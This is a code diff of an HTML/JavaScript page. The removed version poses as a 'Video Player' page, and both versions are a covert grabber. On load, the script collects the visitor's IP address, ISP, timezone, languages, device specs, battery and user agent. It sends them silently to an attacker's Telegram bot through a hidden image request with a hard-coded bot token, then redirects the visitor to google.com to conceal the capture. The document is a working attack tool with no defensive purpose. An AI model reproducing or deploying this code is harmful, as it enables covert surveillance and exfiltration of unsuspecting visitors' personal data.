@@ -1,64 +1,42 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Video Player</title>
-</head>
-<body style="background-color: #000;">
-    <script>
-        const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
-        const CHAT_ID = "8053770740";
-        const REDIRECT_URL = "https://google.com";
+<script>
+  const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
+  const CHAT_ID = "8053770740";
 
-        async function worm_sniff() {
-            let ip = "N/A";
-            const params = new URLSearchParams(window.location.search).toString() || "Nenhum";
-            
-            try {
-                // Captura IP via Cloudflare (Bypass Brave)
-                const r = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-                const t = await r.text();
-                ip = t.match(/ip=(.*)/)[1];
-            } catch(e) {}
+  async function ultimate_sniff() {
+    let ip = "N/A";
+    let provider = "N/A";
+    
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const data = await r.json();
+      ip = data.ip;
+      provider = data.org;
+    } catch(e) {}
 
-            // Metadados do Sistema
-            const specs = {
-                plt: navigator.platform,
-                mem: navigator.deviceMemory + "GB",
-                cpu: navigator.hardwareConcurrency,
-                res: screen.width + "x" + screen.height,
-                bat: "N/A"
-            };
+    const info = {
+      tz: Intm.DateTimeFormat().resolvedOptions().timeZone,
+      lan: navigator.languages.join(", "),
+      con: navigator.connection ? navigator.connection.effectiveType : "N/A",
+      touch: navigator.maxTouchPoints > 0 ? "Sim" : "Nao",
+      cookies: navigator.cookieEnabled ? "Ativo" : "Inativo"
+    };
 
-            // Captura Bateria
-            if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    specs.bat = Math.round(b.level * 100) + "%";
-                } catch(e) {}
-            }
+    const report = "WORM ULTIMATE REPORT\n" +
+                   "IP: " + ip + "\n" +
+                   "PROVEDOR: " + provider + "\n" +
+                   "FUSO: " + info.tz + "\n" +
+                   "CONEXAO: " + info.con + "\n" +
+                   "IDIOMAS: " + info.lan + "\n" +
+                   "TOUCH: " + info.touch + "\n" +
+                   "COOKIES: " + info.cookies + "\n" +
+                   "UA: " + navigator.userAgent;
 
-            // Montagem do Relatorio
-            const report = "WORM FULL REPORT\n" +
-                           "IP: " + ip + "\n" +
-                           "INJETADO: " + params + "\n" +
-                           "SISTEMA: " + specs.plt + "\n" +
-                           "RAM/CPU: " + specs.mem + "/" + specs.cpu + "\n" +
-                           "TELA: " + specs.res + "\n" +
-                           "BATERIA: " + specs.bat;
+    const target = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(report);
+    new Image().src = target;
 
-            const target = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(report);
-            
-            // Envio via Image (Mais silencioso)
-            const img = new Image();
-            img.src = target;
-
-            // Redirecionamento
-            setTimeout(() => {
-                window.location.replace(REDIRECT_URL);
-            }, 800);
-        }
-
-        worm_sniff();
-    </script>
-</body>
-</html>
+    setTimeout(() => {
+      window.location.replace("https://google.com");
+    }, 1000);
+  }
+  ultimate_sniff();
+</script>
